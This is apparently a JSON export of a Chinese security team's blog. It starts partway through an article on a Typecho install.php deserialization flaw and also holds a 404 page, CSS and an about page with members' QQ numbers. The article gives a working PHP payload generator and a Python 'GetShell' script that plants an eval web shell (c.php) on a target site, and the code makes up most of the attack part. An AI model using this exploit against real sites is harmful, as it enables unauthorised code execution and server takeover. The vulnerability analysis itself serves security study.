class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">get</span><span class=\"params\">($key, $default = NULL)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">switch</span> (<span class=\"keyword\">true</span>) &#123;</div><div class=\"line\">            <span class=\"keyword\">case</span> <span class=\"keyword\">isset</span>(<span class=\"keyword\">$this</span>-&gt;_params[$key]):</div><div class=\"line\">                $value = <span class=\"keyword\">$this</span>-&gt;_params[$key];</div><div class=\"line\">                <span class=\"keyword\">break</span>;</div><div class=\"line\">            <span class=\"keyword\">case</span> <span class=\"keyword\">isset</span>(<span class=\"keyword\">self</span>::$_httpParams[$key]):</div><div class=\"line\">                $value = <span class=\"keyword\">self</span>::$_httpParams[$key];</div><div class=\"line\">                <span class=\"keyword\">break</span>;</div><div class=\"line\">            <span class=\"keyword\">default</span>:</div><div class=\"line\">                $value = $default;</div><div class=\"line\">                <span class=\"keyword\">break</span>;</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        $value = !is_array($value) &amp;&amp; strlen($value) &gt; <span class=\"number\">0</span> ? $value : $default;</div><div class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">$this</span>-&gt;_applyFilter($value);</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<p>进入_applyFilter后,可以看见 call_user_func，<br>这时需要设置<code>$this-&gt;_filter</code>为arrsert，作为call_user_func的第一个参数，<br>$value我们也可控，已经可以执行任意代码<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\">    <span class=\"keyword\">private</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">_applyFilter</span><span class=\"params\">($value)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">if</span> (<span class=\"keyword\">$this</span>-&gt;_filter) &#123;</div><div class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">$this</span>-&gt;_filter <span class=\"keyword\">as</span> $filter) &#123;</div><div class=\"line\">                $value = is_array($value) ? array_map($filter, $value) :</div><div class=\"line\">                call_user_func($filter, $value);</div><div class=\"line\">            &#125;</div><div class=\"line\"></div><div class=\"line\">            <span class=\"keyword\">$this</span>-&gt;_filter = <span class=\"keyword\">array</span>();</div><div class=\"line\">        &#125;</div><div class=\"line\"></div><div class=\"line\">        <span class=\"keyword\">return</span> $value;</div><div class=\"line\">    &#125;</div></pre></td></tr></table></figure></p>\n<h1 id=\"EXP\"><a href=\"#EXP\" class=\"headerlink\" title=\"EXP\"></a>EXP</h1><p>主要用于生成__typecho_config 的Payload<br><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">&lt;?php</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"comment\">/**</span></div><div class=\"line\"><span class=\"comment\">* Created by PhpStorm.</span></div><div class=\"line\"><span class=\"comment\">* User: RaI4over</span></div><div class=\"line\"><span class=\"comment\">* Date: 2017/10/19</span></div><div class=\"line\"><span class=\"comment\">* Time: 15:17</span></div><div class=\"line\"><span class=\"comment\">* 生成 _typecho_config 的值</span></div><div class=\"line\"><span class=\"comment\">*/</span></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Typecho_Feed</span></span></div><div class=\"line\"><span class=\"class\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">const</span> RSS2 = <span class=\"string\">'RSS 2.0'</span>;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_type;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_charset;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_lang;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_items = <span class=\"keyword\">array</span>();</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">__construct</span><span class=\"params\">($version, $type = self::RSS2, $charset = <span class=\"string\">'UTF-8'</span>, $lang = <span class=\"string\">'en'</span>)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_version = $version;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_type = $type;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_charset = $charset;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_lang = $lang;</div><div class=\"line\">    &#125;</div><div class=\"line\"></div><div class=\"line\">    <span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">addItem</span><span class=\"params\">(array $item)</span></span></div><div class=\"line\"><span class=\"function\">    </span>&#123;</div><div class=\"line\">        <span class=\"keyword\">$this</span>-&gt;_items[] = $item;</div><div class=\"line\">    &#125;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">Typecho_Request</span></span></div><div class=\"line\"><span class=\"class\"></span>&#123;</div><div class=\"line\">    <span class=\"keyword\">private</span> $_params = <span class=\"keyword\">array</span>(<span class=\"string\">'screenName'</span>=&gt;<span class=\"string\">'fputs(fopen(\\'./usr/themes/default/img/c.php\\',\\'w\\'),\\'&lt;?php @eval($_POST[a]);?&gt;\\')'</span>);</div><div class=\"line\">    <span class=\"keyword\">private</span> $_filter = <span class=\"keyword\">array</span>(<span class=\"string\">'assert'</span>);</div><div class=\"line\">    <span class=\"comment\">//private $_filter = array('assert', array('Typecho_Response', 'redirect'));</span></div><div class=\"line\"></div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\">$payload1 = <span class=\"keyword\">new</span> Typecho_Feed(<span class=\"number\">5</span>, <span class=\"string\">'ATOM 1.0'</span>);</div><div class=\"line\">$payload2 = <span class=\"keyword\">new</span> Typecho_Request();</div><div class=\"line\">$payload1-&gt;addItem(<span class=\"keyword\">array</span>(<span class=\"string\">'author'</span> =&gt; $payload2));</div><div class=\"line\">$exp[<span class=\"string\">'adapter'</span>] = $payload1;</div><div class=\"line\">$exp[<span class=\"string\">'prefix'</span>] = <span class=\"string\">'Rai4over'</span>;</div><div class=\"line\"><span class=\"keyword\">echo</span> base64_encode(serialize($exp));</div></pre></td></tr></table></figure></p>\n<h1 id=\"编写payload的简单思路\"><a href=\"#编写payload的简单思路\" class=\"headerlink\" title=\"编写payload的简单思路\"></a>编写payload的简单思路</h1><p>最外层$exp是数组，数组中的’adapter’是Typecho_Feed的实例$payload1,<br>$payload1的构造参数是’ATOM 1.0’用于控制分支,<br>$payload2是Typecho_Request的实例,<br><code>private $_filter</code> ，<code>private $_params</code>是传给call_user_func的参数，也就是通过assert写shell<br>然后$payload2通过additem添加到$payload的<code>$_items</code>的变量中<br>最后把$payload1添加到最外层的$exp数组中<br>ps：因为install.php中有ob_start();所以构造好是没有回显的，但是也能写shell<br>后面其他师傅说可以用Typecho_Response类中的redirect方法中的exit()得到回显</p>\n<h1 id=\"GetShell小工具\"><a href=\"#GetShell小工具\" class=\"headerlink\" title=\"GetShell小工具\"></a>GetShell小工具</h1><p>记得把php添加进环境变量<br><figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">import</span> requests</div><div class=\"line\"><span class=\"keyword\">import</span> os</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">''' ____          ____      _ _  _</span></div><div class=\"line\"><span class=\"string\">| __ ) _  _  |  _ \\ __ _(_) || |  _____  _____ _ __</span></div><div class=\"line\"><span class=\"string\">|  _ \\| | | |  | |_) / _` | | || |_ / _ \\ \\ / / _ \\ '__|</span></div><div class=\"line\"><span class=\"string\">| |_) | |_| |  |  _ &lt; (_| | |__  _| (_) \\ V /  __/ |</span></div><div class=\"line\"><span class=\"string\">|____/ \\__, |  |_| \\_\\__,_|_|  |_|  \\___/ \\_/ \\___|_|</span></div><div class=\"line\"><span class=\"string\">      |___/</span></div><div class=\"line\"><span class=\"string\">    '''</span></div><div class=\"line\"></div><div class=\"line\">    targert_url = <span class=\"string\">'http://www.xxxxxxxx.xyz'</span>;</div><div class=\"line\"></div><div class=\"line\">    rsp = requests.get(targert_url + <span class=\"string\">\"/install.php\"</span>);</div><div class=\"line\">    <span class=\"keyword\">if</span> rsp.status_code != <span class=\"number\">200</span>:</div><div class=\"line\">        exit(<span class=\"string\">'The attack failed and the problem file does not exist !!!'</span>)</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'You are lucky, the problem file exists, immediately attack !!!'</span></div><div class=\"line\"></div><div class=\"line\">    proxies = &#123;<span class=\"string\">\"http\"</span>: <span class=\"string\">\"http://127.0.0.1:8080\"</span>, <span class=\"string\">\"https\"</span>: <span class=\"string\">\"http://127.0.0.1:8080\"</span>, &#125;</div><div class=\"line\"></div><div class=\"line\">    typecho_config = os.popen(<span class=\"string\">'php exp.php'</span>).read()</div><div class=\"line\"></div><div class=\"line\">    headers = &#123;<span class=\"string\">'User-Agent'</span>: <span class=\"string\">'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0'</span>,</div><div class=\"line\">              <span class=\"string\">'Cookie'</span>: <span class=\"string\">'antispame=1508415662; antispamkey=cc7dffeba8d48da508df125b5a50edbd; PHPSESSID=po1hggbeslfoglbvurjjt2lcg0; __typecho_lang=zh_CN;__typecho_config=&#123;typecho_config&#125;;'</span>.format(typecho_config=typecho_config),</div><div class=\"line\">              <span class=\"string\">'Referer'</span>: targert_url&#125;</div><div class=\"line\"></div><div class=\"line\">    url = targert_url + <span class=\"string\">\"/install.php?finish=1\"</span></div><div class=\"line\"></div><div class=\"line\">    requests.get(url,headers=headers,allow_redirects=<span class=\"keyword\">False</span>)</div><div class=\"line\"></div><div class=\"line\">    shell_url = targert_url + <span class=\"string\">'/usr/themes/default/img/c.php'</span></div><div class=\"line\">    <span class=\"keyword\">if</span> requests.get(shell_url).status_code == <span class=\"number\">200</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">'shell_url: '</span> + shell_url</div><div class=\"line\">    <span class=\"keyword\">else</span>:</div><div class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"Getshell Fail!\"</span></div></pre></td></tr></table></figure></p>\n<p>PS:代码仅用于学习研究，请勿用于非法用途恶意攻击，否则后果作者概不负责。</p>\n","categories":[],"tags":[]},{"title":"404","url":"http://www.chabug.org/404.html","content":"<!DOCTYPE html>\n<html lang=\"zh\">\n    <head>\n        <meta charset=\"utf-8\">\n        <title>404Page Not Found</title>\n        <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n        <style>\n            * {\n                margin: 0;\n                line-height: 1.5;\n            }\n            html {\n                color: #888;\n                font-family: \"Helvetica Neue\", Helvetica, Arial, sans-serif;\n                text-align: center;\n            }\n            body {\n                left: 50%;\n                margin: -43px 0 0 -150px;\n                position: absolute;\n                top: 20%;\n                width: 300px;\n            }\n            h1 {\n                color: #555;\n                font-size: 2em;\n                font-weight: 400;\n            }\nimg {\n    width: 100%;\n}\n            p {\n                line-height: 1.2;\n            }\n            @media only screen and (max-width: 270px) {\n                body {\n                    margin: 10px auto;\n                    position: static;\n                    width: 95%;\n                }\n                h1 {\n                    font-size: 1.5em;\n                }\n            }\n        </style>\n    </head>\n    <body>\n     <img src=\"http://ww1.sinaimg.cn/large/006xriynly1fl71jyn4sog30m80goq34.gif\" alt=\"\">\n        <p>页面不存在或被管理员删除， <span id=\"totalSecond\">3</span>秒后自动返回首页</p>\n    </body>\n<script language=\"javascript\" type=\"text/javascript\">\n<!--\n    var second = document.getElementById('totalSecond').textContent;\n    if (navigator.appName.indexOf(\"Explorer\") > -1)  //判断是IE浏览器还是Firefox浏览器，采用相应措施取得秒数\n    {\n        second = document.getElementById('totalSecond').innerText;\n    } else\n    {\n        second = document.getElementById('totalSecond').textContent;\n    }\n    setInterval(\"redirect()\", 1000);  //每1秒钟调用redirect()方法一次\n    function redirect()\n    {\n        if (second < 0)\n        {\n            location.href = 'http://www.chabug.org/';\n        } else\n        {\n            if (navigator.appName.indexOf(\"Explorer\") > -1)\n            {\n                document.getElementById('totalSecond').innerText = second--;\n            } else\n            {\n                document.getElementById('totalSecond').textContent = second--;\n            }\n        }\n    }\n-->\n</script>\n</html>\n","categories":[],"tags":[]},{"title":"Project","url":"http://www.chabug.org/project/index.html","content":"","categories":[],"tags":[]},{"title":"友链","url":"http://www.chabug.org/link/index.html","content":"","categories":[],"tags":[]},{"title":"搜索","url":"http://www.chabug.org/search/index.html","content":"","categories":[],"tags":[]},{"title":"","url":"http://www.chabug.org/css/personal-style.css","content":"@font-face {\n  font-family: \"Meiryo\";\n  src: url(\"/fonts/Meiryo.eot\");\n  /* IE9 */\n  src: url(\"/fonts/Meiryo.eot?#iefix\") format(\"embedded-opentype\"), /* IE6-IE8 */\n  url(\"/fonts/Meiryo.woff\") format(\"woff\"), /* chrome, firefox */\n  url(\"/fonts/Meiryo.ttf\") format(\"truetype\"), /* chrome, firefox, opera, Safari, Android, iOS 4.2+ */\n  url(\"/fonts/Meiryo.svg#Meiryo\") format(\"svg\");\n  /* iOS 4.1- */\n  font-style: normal;\n  font-weight: normal;\n}\nhtml.page-home {\n  /*background-image: url('/images/bg.jpg')*/\n  /*background: linear-gradient( #1abc9c, transparent), linear-gradient( 90deg, skyblue, transparent), linear-gradient( -90deg, coral, transparent);*/\n  /*background-blend-mode: screen;*/\n  /*background: linear-gradient(to left, #5f2c82, #49a09d);*/\n}\n","categories":[],"tags":[]},{"title":"我们的辣鸡团队","url":"http://www.chabug.org/about/index.html","content":"<h1 id=\"关于本站\"><a href=\"#关于本站\" class=\"headerlink\" title=\"关于本站\"></a>关于本站</h1><p>以前的文章虽然数据什么的都保存了，但<code>买不起</code>服务器🤢。<del>我也就准备一篇文章一篇文章搬过来了。</del><br><strong>搬个鸡儿，太麻烦了。</strong> 打算重新开始😕<br>原来使用WordPress搭建的社区，但是忍不了WP的臃肿和加载速度，所以转战Hexo。<br>现在使用Hexo生成静态页面然后部署到GitHub上，全站静态页面。<br>主题使用<a href=\"https://github.com/forsigner/fexo\" target=\"_blank\" rel=\"external\">fexo</a>主题 <a href=\"https://ioliu.cn/2017/add-valine-comments-to-your-blog/\" target=\"_blank\" rel=\"external\">Valine评论系统</a>。<a href=\"https://github.com/fancyapps/fancybox\" target=\"_blank\" rel=\"external\">fancybox</a>，<a href=\"https://github.com/rstacruz/nprogress\" target=\"_blank\" rel=\"external\">nprogress</a>，<a href=\"https://github.com/EYHN/hexo-helper-live2d\" target=\"_blank\" rel=\"external\">live2d</a>效果以后可能会加。</p>\n<h1 id=\"团队成员\"><a href=\"#团队成员\" class=\"headerlink\" title=\"团队成员\"></a>团队成员</h1><table>\n<thead>\n<tr>\n<th style=\"text-align:center\">序号</th>\n<th style=\"text-align:center\">QQ</th>\n<th style=\"text-align:center\">个人博客</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style=\"text-align:center\">初遇</td>\n<td style=\"text-align:center\">45418382</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">二黑</td>\n<td style=\"text-align:center\">1527328514</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">饭饭</td>\n<td style=\"text-align:center\">2274357070</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Soul</td>\n<td style=\"text-align:center\">1399925358</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">X1r0z</td>\n<td style=\"text-align:center\">462247949</td>\n<td style=\"text-align:center\"><a href=\"http://exp10it.tk/\" target=\"_blank\" rel=\"external\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">小超</td>\n<td style=\"text-align:center\">2529134183</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">子非鱼</td>\n<td style=\"text-align:center\">894360738</td>\n<td style=\"text-align:center\"><a href=\"http://www.5ih5.com.cn/\" target=\"_blank\" rel=\"external\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">老顽童</td>\n<td style=\"text-align:center\">2731749632</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Sp4z</td>\n<td style=\"text-align:center\">1055170452</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">V2</td>\n<td style=\"text-align:center\">1944995203</td>\n<td style=\"text-align:center\"><a href=\"http://www.chabug.org/\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">小影</td>\n<td style=\"text-align:center\">1539747235</td>\n<td style=\"text-align:center\"><a href=\"http://www.cnblogs.com/wlke\" target=\"_blank\" rel=\"external\">Here!</a></td>\n</tr>\n<tr>\n<td style=\"text-align:center\">Szrzvdny</td>\n<td style=\"text-align:center\">317718435</td>\n<td style=\"text-align:center\"><a href=\"http://www.inksec.cn/\" target=\"_blank\" rel=\"external\">Here!</a></td>\n</tr>\n</tbody>\n</table>\n<h1 id=\"加入我们\"><a href=\"#加入我们\" class=\"headerlink\" title=\"加入我们\"></a>加入我们</h1><ul>\n<li>三篇实战淫荡思路文章</li>\n<li>熟悉PHP、Python或其他编程语言</li>\n<li><strong>有一颗团结上进的心</strong></li>\n</ul>\n<h1 id=\"联系我们\"><a href=\"#联系我们\" class=\"headerlink\" title=\"联系我们\"></a>联系我们</h1><p><code>admin@chabug.org</code></p>\n<h1 id=\"未来发展\"><a href=\"#未来发展\" class=\"headerlink\" title=\"未来发展\"></a>未来发展</h1><p>文章不定时更新，干货湿货参半吧。</p>\n<h1 id=\"写在后面\"><a href=\"#写在后面\" class=\"headerlink\" title=\"写在后面\"></a>写在后面</h1><p>我只想拥有一支融洽的团队，用心做安全，仅此而已。  </p>\n<blockquote>\n<p>网络安全不能一直靠司法政策压制，技术对抗才是保证安全的本源。</p>\n</blockquote>\n","categories":[],"tags":[]}]